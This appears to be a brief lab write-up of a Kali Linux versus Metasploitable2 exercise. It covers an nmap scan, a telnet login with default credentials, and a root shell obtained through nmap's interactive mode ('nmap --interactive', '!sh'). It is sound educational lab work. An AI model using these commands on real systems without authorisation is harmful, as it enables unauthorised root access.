# Cybersecurity Lab (Kali Linux + Metasploitable2)

## Objective

To set up a penetration testing lab and perform vulnerability scanning, exploitation, and privilege escalation.

## Tools Used

* Kali Linux (Attacker)
* Metasploitable2 (Target)
* UTM (Virtualization)
* Nmap
* Telnet

## Network Configuration

* Kali Linux IP: 192.168.64.X
* Metasploitable IP: 192.168.128.3

## Scanning Phase

Command used:
nmap -A 192.168.128.3

## Exploitation Phase
Used Telnet with default credentials:
telnet 192.168.128.3

## Privilege Escalation
Used Nmap interactive mode:
nmap --interactive
!sh

## Result
whoami → root

Full system access achieved.

##  Conclusion

This lab demonstrates how weak credentials and vulnerable services can lead to complete system compromise.
